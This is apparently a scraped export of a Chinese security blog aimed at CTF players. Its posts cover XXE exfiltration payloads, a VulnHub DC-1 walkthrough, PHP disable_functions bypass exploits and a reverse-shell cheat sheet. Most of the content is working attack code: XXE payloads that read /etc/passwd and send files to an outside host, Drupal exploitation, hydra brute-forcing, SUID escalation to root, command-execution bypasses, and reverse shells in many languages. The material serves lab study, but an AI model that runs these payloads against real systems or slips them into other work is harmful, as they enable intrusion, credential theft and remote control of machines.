U+0065。如果想将其表示为一个字符实体，可以输入 &amp;#65;（十进制值）或 &amp;#x41;（十六进制值） 命名实体(内部实体)： 1&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt; 命名实体在 DTD 或内部子集（即文档中 &lt;!DOCTYPE&gt; 语句的一部分）中声明，在文档中用作引用。在 XML 文档解析过程中，实体引用将由它的表示替代。 外部实体: 1&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt; 外部实体表示外部文件的内容，在有些情况下很有用，比如说，您在创建一本图书并且想将每一章存储为一个单独的文件。您可能会创建一组如下所示的实体。 123&lt;!ENTITY chap1 SYSTEM &quot;chapter-1.xml&quot;&gt;&lt;!ENTITY chap2 SYSTEM &quot;chapter-2.xml&quot;&gt;&lt;!ENTITY chap3 SYSTEM &quot;chapter-3.xml&quot;&gt; 现在，当您在主图书 XML 文件中将这些实体放到一起时，这些文件的内容将插入在引用点。 123456789&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY chap1 SYSTEM &quot;chapter-1.xml&quot;&gt; &lt;!ENTITY chap2 SYSTEM &quot;chapter-2.xml&quot;&gt; &lt;!ENTITY chap3 SYSTEM &quot;chapter-3.xml&quot;&gt; &amp;chap1; &amp;chap2; &amp;chap3;]&gt; 由于这些文件的内容被插入到 XML 文档中，因此它们也必须是有效的 XML，而且它们必须是平衡的.当上面的 XML 文档被解析时，它将被读取为一个大文档，包含 chapter-1.xml、chapter-2.xml 和 chapter-3.xml 文件的内容。 参数实体： 123&lt;!ENTITY % 实体名称 &quot;实体的值&quot;&gt;或者&lt;!ENTITY % 实体名称 SYSTEM &quot;URI&quot;&gt; 参数实体只用于 DTD 和文档的内部子集中。它们使用百分号（%）而不是与字符，可以是命名实体或外部实体。 注意点： 参数实体必须定义在单独的DTD文档中或XML文档的DTD区(但是引用只能在DTD文档中，即外部子集，而不能在XML文档的DTD区)，前者为该XML文档的外部子集，后者为该XML文档的内部子集。 参数实体的作用是作为DTD中的元素的条件控制。参数实体定义以%作为开头，引用也以%开头，以;结尾 语法引用外部的实体，而非内部实体，那么URL中能写哪些类型的外部实体呢？ 主要的有file、http、https、ftp等等，当然不同的程序支持的不一样： 漏洞利用任意文件读取1234567&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % remote SYSTEM &quot;http://yourhost/test.xml&quot;&gt; &lt;!ENTITY % file SYSTEM &quot;php://filter/convert.base64-encode/resource=file:///flag&quot;&gt; %remote; %send;]&gt; 12345&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;]&gt;&lt;ticket&gt;&lt;username&gt;&amp;file;&lt;&#x2F;username&gt;&lt;code&gt;dsad&lt;&#x2F;code&gt;&lt;&#x2F;ticket&gt; 引入服务器DTD文件Blind XXE(OOB)第一种方式： payload: 12345678&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY[&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;&gt;&lt;!ENTITY % remote SYSTEM &quot;http://your_vps/test.dtd&quot;&gt;%remote;%all;]&gt;&lt;root&gt;&amp;send;&lt;/root&gt; vps上的test.dtd 1&lt;!ENTITY % all &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http:&#x2F;&#x2F;your_vps&#x2F;get.php?file&#x3D;%file;&#39;&gt;&quot;&gt; 注意：如果定义成参数实体的话%需要实体编码 第二种方式: 自己vps上的dtd 12&lt;!ENTITY % start &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http:&#x2F;&#x2F;myip:10001&#x2F;?%file;&#39;&gt;&quot;&gt;%start; payload: 12345678&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % remote SYSTEM &quot;http://myip/xml.dtd&quot;&gt; &lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;&gt; %remote; %send;]&gt;&lt;message&gt;1234&lt;/message&gt; 使用的php://filter将文件内容进行了base64编码，因为当我们读取的文件是php或则html文件时，文件的代码包含&lt; &gt;符号时会导致解析错误 让存在漏洞的地方先加载自己服务器上的dtd文件，然后让其请求并带上利用php伪协议base64加密的文件内容，通过服务端的日志即可做到不回显的任意文件读取 第三种方式: vps上的test.dtd 12&lt;!ENTITY % f SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http:&#x2F;&#x2F;127.0.0.1:9001&#x2F;?p&#x3D;%f;&#39;&gt;&quot;&gt; payload： 123456&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE convert [ &lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;yourvps&#x2F;test.dtd&quot;&gt;%remote;%int;%send;]&gt;&lt;msg&gt;&lt;id&gt;moonback&lt;&#x2F;id&gt;&lt;name&gt;aasd&lt;&#x2F;name&gt;&lt;level&gt;1000&lt;&#x2F;level&gt;&lt;time&gt;415441&lt;&#x2F;time&gt;&lt;&#x2F;msg&gt; 这种的好处是没有file://,php://filter等关键词 基于报错的Blind XXE基于报错的原理和OOB类似，OOB通过构造一个带外的url将数据带出，而基于报错是构造一个错误的url并将泄露文件内容放在url中，通过这样的方式返回数据 通过引入服务器文件 xml.dtd 12&lt;!ENTITY % start &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;file:&#x2F;&#x2F;&#x2F;hhhhhhh&#x2F;%file;&#39;&gt;&quot;&gt;%start; payload 12345678&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;you_vps&#x2F;xml.dtd&quot;&gt; &lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt; %remote; %send;]&gt;&lt;message&gt;1234&lt;&#x2F;message&gt; 通过引入本地文件 123456789101112&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % remote SYSTEM &quot;&#x2F;usr&#x2F;share&#x2F;yelp&#x2F;dtd&#x2F;docbookx.dtd&quot;&gt; &lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt; &lt;!ENTITY % ISOamso &#39; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; send SYSTEM &amp;#x27;file:&#x2F;&#x2F;hhhhhhhh&#x2F;?&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;send; &#39;&gt; %remote;]&gt;&lt;message&gt;1234&lt;&#x2F;message&gt; CoogleCTF上的一道题：链接 writeup payload： 123456789101112&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [ &lt;!ELEMENT message ANY&gt; &lt;!ENTITY % remote SYSTEM &quot;&#x2F;usr&#x2F;share&#x2F;yelp&#x2F;dtd&#x2F;docbookx.dtd&quot;&gt; &lt;!ENTITY % para1 SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt; &lt;!ENTITY % ISOamso &#39; &lt;!ENTITY &amp;#x25; para2 &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:&#x2F;&#x2F;&#x2F;&amp;#x25;para1;&amp;#x27;&gt;&quot;&gt; &amp;#x25;para2; &#39;&gt; %remote;]&gt;&lt;message&gt;10&lt;&#x2F;message&gt; 还不太懂！！！！ 漏洞修复使用开发语言提供的禁用外部实体的方法PHP： 1libxml_disable_entity_loader(true); Libxml2.9.0 以后 ，默认不解析外部实体 JAVA: 12DocumentBuilderFactory dbf &#x3D;DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false); Python： 12from lxml import etreexmlData &#x3D; etree.parse(xmlSource,etree.XMLParser(resolve_entities&#x3D;False)) 过滤用户提交的XML数据 过滤关键词：&lt;!DOCTYPE和&lt;!ENTITY，或者SYSTEM和PUBLIC 参考：好文，作者有心了！！！ https://www.freebuf.com/vuls/207639.html","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://www.moonback.xyz/tags/web/"},{"name":"ctf","slug":"ctf","permalink":"http://www.moonback.xyz/tags/ctf/"},{"name":"xxe","slug":"xxe","permalink":"http://www.moonback.xyz/tags/xxe/"}]},{"title":"VulnHub之DC-1靶机","slug":"vulnhub-dc-1","date":"2019-12-12T14:35:35.000Z","updated":"2020-01-01T14:10:12.953Z","comments":true,"path":"2019/12/12/vulnhub-dc-1/","link":"","permalink":"http://www.moonback.xyz/2019/12/12/vulnhub-dc-1/","excerpt":"本篇博客主要记录一下玩VulnHub上的DC-1靶机的过程！！！","text":"本篇博客主要记录一下玩VulnHub上的DC-1靶机的过程！！！ flag1本地配好环境，这里网络连接我用的是NAT方式 靶机：192.168.17.149 kali：192.168.17.146 事先不知道ip的话可以先用arp-scan扫一下 arp-scan --interface=eth0 --localnet nmap扫下看开放了哪些端口 80端口开放，访问以下网站 看到是Drupal的cms，打开msf，search一下，用最新的exploit(unix/webapp/drupal_drupalgeddon2)，成功返回meterpreter，进入shell，执行命令进入一个标准的shell，ls得到flag1，查看内容 python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot; flag2提示让我们看配置文件，搜一下配置文件位置/sites/default/settings.php 得到flag2和数据库账号密码 flag3登陆一下mysql mysql -h localhost -u dbuser -p 查看drupaldb里users表里的内容 有两种方法： 方式1： 用同样的加密方式加密一个我们知道的密钥，然后update数据库修改原密码，在Drupal7项目所在的目录用以下命令即可获得加密结果 php scripts/password-hash.sh admin 然后再数据库里更新 update users set pass=&quot;$S$DsBR4rNeiIzheuLDAdLE932hUtDgoeE6BFmP2oRifCt.4piniN7u&quot; where name=&quot;admin&quot;; 登陆一下，在Dashboard发现flag3，提示我们passwd 方式2： 查看下Drupal的版本，includes/bootstrap.inc是默认的版本信息 cat /var/www/includes/bootstrap.inc | grep VERSION 可以看到是7.24的版本，searchsploit搜索一下 发现好像有sql注入漏洞，直接用exp(/usr/share/exploitdb/exploits/php/webapps/34992.py) python /usr/share/exploitdb/exploits/php/webapps/34992.py -t http://192.168.17.149/ -u moonback -p moonback 我们就成功创建一个和admin一样的用户，其他的exp应该也可以用，没有测试 flag4跟着flag3的提示，看看/etc/passwd吧，找到flag4，存在flag4用户 会不会是弱口令？用hydra爆破一下吧 hydra -l flag4 -P /root/Desktop/字典/pass.txt ssh://192.168.17.149 -t 64 最后爆破出来的是orange，ssh登上,得到flag4，提示下一个flag在/root目录下 thefinalflag提权吧！提示也给了用find提权（suid提权） find / -user root -perm -4000 -print 2&gt;/dev/null find / -perm -u=s -type f 2&gt;/dev/null find / -user root -perm -4000 -exec ls -ldb &#123;&#125; \\; #查看具有root用户权限的SUID文件 发现find命令在里面，suid提权的大概意思就是：如果命令以SUID权限运行，所有通过该命令执行的命令都会以root权限运行 find /etc/passwd -exec whoami \\; 所以我们直接让它弹个root的shell find /etc/passwd -exec /bin/sh \\; 成功通关！！！","categories":[],"tags":[{"name":"VulnHub","slug":"VulnHub","permalink":"http://www.moonback.xyz/tags/VulnHub/"},{"name":"靶机","slug":"靶机","permalink":"http://www.moonback.xyz/tags/%E9%9D%B6%E6%9C%BA/"},{"name":"MSF","slug":"MSF","permalink":"http://www.moonback.xyz/tags/MSF/"}]},{"title":"绕过php部分配置","slug":"bypass-php-ini","date":"2019-11-29T08:49:44.000Z","updated":"2020-01-16T10:03:53.292Z","comments":true,"path":"2019/11/29/bypass-php-ini/","link":"","permalink":"http://www.moonback.xyz/2019/11/29/bypass-php-ini/","excerpt":"本篇博客介绍了绕过一些php配置的方法！","text":"本篇博客介绍了绕过一些php配置的方法！ bypass disable_functions顾名思义，disable_functions即不能使用的php函数 LD_PRELOADLD_PRELOAD是Linux中的环境变量，可以设置成一个指定库的路径，动态链接时较其他库有着更高的优先级，允许预加载指定库中的函数和符号覆盖掉后续链接的库中的函数和符号 php的mail()函数在执行过程中会默认调用系统程序/usr/sbin/sendmail，而/usr/sbin/sendmail会调用getuid()。如果我们能通过LD_PRELOAD的方式来劫持getuid()，再用mail()函数来触发sendmail程序进而执行被劫持的getuid()，从而就能执行恶意代码了 捋下思路： 编写一个原型为 uid_t getuid(void); 的 C 函数，内部执行攻击者指定的代码，并编译成共享对象 evil.so 运行 PHP 函数 putenv()，设定环境变量 LD_PRELOAD 为 evil.so，以便后续启动新进程时优先加载该共享对象 运行 PHP 的 mail() 函数，mail() 内部启动新进程 /usr/sbin/sendmail，由于上一步 LD_PRELOAD 的作用，sendmail 调用的系统函数 getuid() 被优先级更好的 evil.so 中的同名 getuid() 所劫持 达到不调用 PHP 的各种命令执行函数（system()、exec() 等等）仍可执行系统命令的目的 怎样编写一个共享库文件呢？ 编写test.c 12345678910#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;int geteuid() &#123; const char* cmdline &#x3D; getenv(&quot;EVIL_CMDLINE&quot;); if (getenv(&quot;LD_PRELOAD&quot;) &#x3D;&#x3D; NULL) &#123; return 0; &#125; unsetenv(&quot;LD_PRELOAD&quot;); system(cmdline);&#125; 编译生成共享库文件： gcc -shared -fPIC test.c -o test.so 绕过disable_functions github上有个项目 EXP地址：https://github.com/l3m0n/Bypass_Disable_functions_Shell 这里面的仓库里有编译生成好的共享库文件，可以直接使用，通过设置EVIL_CMDLINE来执行系统命令 php利用代码： 12345&lt;?php putenv(&#39;EVIL_CMDLINE&#x3D;&#39;.&#39;cd &#x2F;%26%26.&#x2F;readflag &gt; &#x2F;tmp&#x2F;moonback1 2&gt;%261&#39;); &#x2F;&#x2F;EVIL_CMDLINE&#x3D;shell命令，并将结果输出到一个文件putenv(&#39;LD_PRELOAD&#x3D;&#39;.&#39;&#x2F;tmp&#x2F;bypass_disablefunc_x64.so&#39;); &#x2F;&#x2F;LD_PRELOAD&#x3D;动态加载库的位置mail(&#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;); &#x2F;&#x2F;用mail函数触发?&gt; 这上面有道题（RCE me）我用的就是用的这种方法http://www.moonback.xyz/2019/11/06/syc-ctf-wp/ COM组件需要php配置里开启com.allow_dcom，在php/ext/里面查找是否存在php_com_dotnet.dll这个文件 extension=php_com_dotnet.dll com.allow_dcom = true EXP: 123456789&lt;?php$command &#x3D; $_GET[&#39;cmd&#39;];$wsh &#x3D; new COM(&#39;WScript.shell&#39;); &#x2F;&#x2F; 生成一个COM对象 Shell.Application也能$exec &#x3D; $wsh-&gt;exec(&quot;cmd &#x2F;c&quot;.$command); &#x2F;&#x2F;调用对象方法来执行命令$stdout &#x3D; $exec-&gt;StdOut();$stroutput &#x3D; $stdout-&gt;ReadAll();echo $stroutput;?&gt; 这里创建一个COM对象，然后通过调用COM对象的exec()方法来实现执行系统命令，从而绕过disable_functions禁用PHP命令执行函数的限制 imap_open(CVE-2018-19518)在php.ini中开启imap.enable_insecure_rsh选项为On 具体原理参见这位大佬的博客：https://www.mi1k7ea.com/2019/06/02/浅谈几种Bypass-disable-functions的方法/#0x07-利用imap-open-绕过 EXP: 1234567891011&lt;?phperror_reporting(0);if (!function_exists(&#39;imap_open&#39;)) &#123; die(&quot;no imap_open function!&quot;);&#125;$server &#x3D; &quot;x -oProxyCommand&#x3D;echo\\t&quot; . base64_encode($_GET[&#39;cmd&#39;] . &quot;&gt;&#x2F;tmp&#x2F;cmd_result&quot;) . &quot;|base64\\t-d|sh&#125;&quot;;&#x2F;&#x2F;$server &#x3D; &#39;x -oProxyCommand&#x3D;echo$IFS$()&#39; . base64_encode($_GET[&#39;cmd&#39;] . &quot;&gt;&#x2F;tmp&#x2F;cmd_result&quot;) . &#39;|base64$IFS$()-d|sh&#125;&#39;;imap_open(&#39;&#123;&#39; . $server . &#39;:143&#x2F;imap&#125;INBOX&#39;, &#39;&#39;, &#39;&#39;); &#x2F;&#x2F; or var_dump(&quot;\\n\\nError: &quot;.imap_last_error());sleep(5);echo file_get_contents(&quot;&#x2F;tmp&#x2F;cmd_result&quot;);?&gt; ImageMagick这里直接上EXP: 1234567891011121314151617181920&lt;?phpecho &quot;Disable functions: &quot; . ini_get(&quot;disable_functions&quot;) . &quot;\\n&quot;;$command &#x3D; isset($_GET[&#39;cmd&#39;]) ? $_GET[&#39;cmd&#39;] : &#39;id&#39;;echo &quot;Run command: $command\\n&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;\\n&quot;;$data_file &#x3D; tempnam(&#39;&#x2F;tmp&#39;, &#39;img&#39;);$imagick_file &#x3D; tempnam(&#39;&#x2F;tmp&#39;, &#39;img&#39;);$exploit &#x3D; &lt;&lt;&lt;EOFpush graphic-contextviewbox 0 0 640 480fill &#39;url(https:&#x2F;&#x2F;127.0.0.1&#x2F;image.jpg&quot;|$command&gt;$data_file&quot;)&#39;pop graphic-contextEOF;file_put_contents(&quot;$imagick_file&quot;, $exploit);$thumb &#x3D; new Imagick();$thumb-&gt;readImage(&quot;$imagick_file&quot;);$thumb-&gt;writeImage(tempnam(&#39;&#x2F;tmp&#39;, &#39;img&#39;));$thumb-&gt;clear();$thumb-&gt;destroy();echo file_get_contents($data_file);?&gt; bypass allow_url_includeall_url_include即是否允许远程包含，默认关闭 SMB服务安装SAMBA服务器 apt-get install samba 创建共享目录 mkdir /smb chmod 0555 /smb/ chown -R nobody:nogroup /smb/ 配置SAMBA服务器配置文件 echo &gt; /etc/samba/smb.conf 其中写入以下内容 123456789101112131415161718[global]workgroup &#x3D; WORKGROUPserver string &#x3D; Samba Server %vnetbios name &#x3D; indishell-labsecurity &#x3D; usermap to guest &#x3D; bad username resolve order &#x3D; bcast hostdns proxy &#x3D; nobind interfaces only &#x3D; yes[ethan]path &#x3D; &#x2F;smbwritable &#x3D; noguest ok &#x3D; yesguest only &#x3D; yesread only &#x3D; yesdirectory mode &#x3D; 0555force user &#x3D; nobody 重启服务 service smbd restart 访问就可以通过\\\\192.168.23.129\\ethan\\shell.php Webdav可以在docker里搭一个 docker run -v /root/webdav:/var/lib/dav -e ANONYMOUS_METHODS=GET,OPTIONS,PROPFIND -e LOCATION=/webdav -p 8000:80 --rm --name webdav bytemark/webdav 然后把php文件放到/root/webdav/data/里面，包含//ip:8000//webdav/shell.php就行 bypass open_basediropen_basedir即用来对用户访问文件的活动范围限制在指定的区域 具体内容可以参见大佬的博客https://www.mi1k7ea.com/2019/07/20/浅谈几种Bypass-open-basedir的方法/ glob://伪协议symlink()函数","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://www.moonback.xyz/tags/web/"},{"name":"php","slug":"php","permalink":"http://www.moonback.xyz/tags/php/"},{"name":"bypass","slug":"bypass","permalink":"http://www.moonback.xyz/tags/bypass/"}]},{"title":"shell和反弹shell","slug":"reverse-shell","date":"2019-11-27T14:00:01.000Z","updated":"2021-02-04T12:21:27.508Z","comments":true,"path":"2019/11/27/reverse-shell/","link":"","permalink":"http://www.moonback.xyz/2019/11/27/reverse-shell/","excerpt":"本篇博客主要介绍了shell和反弹shell的一些常见方法以及如何在shell下载文件！","text":"本篇博客主要介绍了shell和反弹shell的一些常见方法以及如何在shell下载文件！ 反弹shell什么是反弹shell？ 反弹shell，即reverse shell，一般情况下指在本地的命令行的输入输出转到控制端得以执行。 正向连接假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面，web服务，ssh，telnet等等，都是正向连接。 但这种有局限性： 如果被控端再内网中，不能直接连接 防火墙的限制 反弹shell就是控制端监听在某TCP/UDP端口，被控制端主动连接控制端的这一端口，控制端可以通过这一端口进行相关命令操作。 反向shell通常用于被控端因防火墙受限、权限不足、端口被占用等情形，同时也实现了被控端的精准控制（指定了被控制端的IP，除此之外的是无法和被控端无法连接）。 下面的例子主要是反向反弹shell，以下的有些方法可将/bin/bash替换成cmd.exe用于windows反弹shell 反弹shellbash1bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;x.x.x.x&#x2F;port 0&gt;&amp;1 bash -i 打开一个交互的bash &gt;&amp; 将标准错误输出重定向到标准输出 /dev/tcp/x.x.x.x/port 意为调用socket,建立socket连接,其中x.x.x.x为要反弹到的主机ip，port为端口 0&gt;&amp;1 标准输入重定向到标准输出，实现你与反弹出来的shell的交互 注：/dev/tcp/ 是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接，读写这个文件就相当于在这个socket连接中传输数据。同理，Linux中还存在/dev/udp/。 base64编码地址：http://www.jackson-t.ca/runtime-exec-payloads.html 1&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjEuMS4xLzkwMDAgMD4mMQ&#x3D;&#x3D;&#125;|&#123;base64,-d&#125;|bash exec12exec 5&lt;&gt;/dev/tcp/192.168.99.242/1234;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5;doneexec /bin/sh 0&lt;/dev/tcp/192.168.99.242/1234 1&gt;&amp;0 2&gt;&amp;0 awk1awk &#x27;BEGIN&#123;s=&quot;/inet/tcp/0/192.168.99.242/1234&quot;;for(;s|&amp;getline c;close(c))while(c|getline)print|&amp;s;close(s)&#125;&#x27; telnet需要在攻击主机上分别监听1234和4321端口，执行反弹shell命令后，在1234终端输入命令，4321查看命令执行后的结果。 1telnet 192.168.99.242 1234 | /bin/bash | telnet 192.168.99.242 4321 socat反弹1socat exec:&#x27;bash -li&#x27;,pty,stderr,setsid,sigint,sane tcp:192.168.99.242:1234 netcatLinux中nc命令是一个功能强大的网络工具，全称是netcat 选项： 1234567891011121314-g&lt;网关&gt;：设置路由器跃程通信网关，最多设置8个；-G&lt;指向器数目&gt;：设置来源路由指向器，其数值为4的倍数；-h：在线帮助；-i&lt;延迟秒数&gt;：设置时间间隔，以便传送信息及扫描通信端口；-l：使用监听模式，监控传入的资料；-n：直接使用ip地址，而不通过域名服务器；-o&lt;输出文件&gt;：指定文件名称，把往来传输的数据以16进制字码倾倒成该文件保存；-p&lt;通信端口&gt;：设置本地主机使用的通信端口；-r：指定源端口和目的端口都进行随机的选择；-s&lt;来源位址&gt;：设置本地主机送出数据包的IP地址；-u：使用UDP传输协议；-v：显示指令执行过程；-w&lt;超时秒数&gt;：设置等待连线的时间；-z：使用0输入&#x2F;输出模式，只在扫描通信端口时使用 常用的命令： 1234567被控端：nc 192.168.31.174 8080 -t -e &#x2F;bin&#x2F;bash通过webshell我们可以使用nc命令直接建立一个tcp 8080 的会话连接，然后将本地的bash通过这个会话连接反弹给目标主机（192.168.31.174）控制端：nc -lvp 8080使用监听模式监听8080端口，并显示命令执行过程 Python1python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;]);&#39; 如果目标机器上有pty模块，可以直接 1python -c &quot;import pty;pty.spawn(&#39;&#x2F;bin&#x2F;bash&#39;)&quot; Powershell1powershell IEX (New-Object System.Net.Webclient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;besimorhino&#x2F;powercat&#x2F;master&#x2F;powercat.ps1&#39;);powercat -c 192.168.159.134 -p 6666 -e cmd 用于windows的反弹shell php1php -r &#39;$sock&#x3D;fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;&#x2F;bin&#x2F;sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39; Perl方法1： 1perl -e &#39;use Socket;$i&#x3D;&quot;10.0.0.1&quot;;$p&#x3D;1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;&#x2F;bin&#x2F;sh -i&quot;);&#125;;&#39; 方法2： 1perl -MIO -e &#39;$p&#x3D;fork;exit,if($p);$c&#x3D;new IO::Socket::INET(PeerAddr,&quot;x.x.x.x:5555&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39; Ruby方法1： 1ruby -rsocket -e &#39;exit if fork;c&#x3D;TCPSocket.new(&quot;x.x.x.x&quot;,&quot;5555&quot;);while(cmd&#x3D;c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#39; 方法2： 1ruby -rsocket -e&#39;f&#x3D;TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;&#x2F;bin&#x2F;sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#39; Java12345678910111213public class Revs &#123; &#x2F;** * @param args * @throws Exception *&#x2F; public static void main(String[] args) throws Exception &#123; &#x2F;&#x2F; TODO Auto-generated method stub Runtime r &#x3D; Runtime.getRuntime(); String cmd[]&#x3D; &#123;&quot;&#x2F;bin&#x2F;bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;&#x2F;dev&#x2F;tcp&#x2F;x.x.x.x&#x2F;5555;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;&#125;; Process p &#x3D; r.exec(cmd); p.waitFor(); &#125;&#125; Lua1lua -e &quot;require(&#39;socket&#39;);require(&#39;os&#39;);t&#x3D;socket.tcp();t:connect(&#39;x.x.x.x&#39;,&#39;5555&#39;);os.execute(&#39;&#x2F;bin&#x2F;sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#39;);&quot; shell下载文件先把文件放到有公网的服务器上 windows方法1(powershell): 1powershell (new-object System.Net.WebClient).DownloadFile( &#39;http:&#x2F;&#x2F;****&#x2F;***&#39;,&#39;C:&#x2F;Users&#x2F;Public&#x2F;a.exe&#39;) 方法2(certutil)： 1certutil -urlcache -split -f http:&#x2F;&#x2F;***&#x2F;a.exe C:&#x2F;Users&#x2F;a.exe 方法3(bitsadmin): 1bitsadmin &#x2F;transfer n http:&#x2F;&#x2F;download.fb.com&#x2F;file&#x2F;xx.zip c:\\pentest\\xx.zip Linux方法1(curl): 1curl -O http:&#x2F;&#x2F;****&#x2F;a.exe 方法2(nc): 12345678910111213&#x2F;&#x2F; 在 45.77.17.128 这台主机监听 9988 端口（注意符号是 &quot;&lt;&quot; ）# nc -l 9988 &lt; Python-3.6.6.tar.xz&#x2F;&#x2F; 在 192.168.1.254 这台主机下载文件（注意符号是 &quot;&gt;&quot; ）# nc --recv-only 45.77.17.128 9988 &gt; Python-3.6.6.tar.xz或者&#x2F;&#x2F; 在 45.77.17.128 这台主机监听 9988 端口（注意符号是 &quot;&gt;&quot; ）# nc -l 9988 &gt; command.tar.gz&#x2F;&#x2F; 在 192.168.1.254 这台主机上传文件（注意符号是 &quot;&lt;&quot; ）# nc --send-only 45.77.17.128 9988 &lt; command.tar.gz 方法3(wegt): 1wegt http:&#x2F;&#x2F;****&#x2F;a.sh 参考： http://www.gtfly.top/2019/05/09/反弹shell.html https://brucetg.github.io/2018/05/03/多种姿势反弹shell/","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://www.moonback.xyz/tags/web/"},{"name":"ctf","slug":"ctf","permalink":"http://www.moonback.xyz/tags/ctf/"},{"name":"shell","slug":"shell","permalink":"http://www.moonback.xyz/tags/shell/"}]},{"title":"ubuntu16.04 CTFd平台搭建","slug":"ctfd-build","date":"2019-11-13T09:55:29.000Z","updated":"2020-04-03T14:45:26.553Z","comments":true,"path":"2019/11/13/ctfd-build/","link":"","permalink":"http://www.moonback.xyz/2019/11/13/ctfd-build/","excerpt":"本篇博客主要介绍了如何在ubuntu16.04用docker搭建平台，以及部署题目等等！","text":"本篇博客主要介绍了如何在ubuntu16.04用docker搭建平台，以及部署题目等等！ 安装环境安装前先说一下我的环境，阿里云学生机 安装git(有的话忽略） sudo apt-get update sudo apt-get install git 安装docker 卸载旧版本的docker sudo apt-get remove docker docker-engine docker.io containerd runc 安装以下包以使apt可以通过HTTPS使用存储库（repository） sudo apt-get install -y apt-transport-https ca-certificates curl software-properties-common 添加Docker官方的GPG密钥 curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add - 使用下面的命令来设置stable官方存储库 sudo add-apt-repository &quot;deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable&quot; 或者使用阿里云镜像，使用下面（推荐使用） 12345curl -fsSL https://mirrors.aliyun.com/docker-ce/linux/ubuntu/gpg | sudo apt-key add -sudo add-apt-repository \\&quot;deb [arch=amd64] https://mirrors.aliyun.com/docker-ce/linux/ubuntu \\$(lsb_release -cs) \\stable&quot; 再更新一下apt包索引 sudo apt-get update 安装dockerce 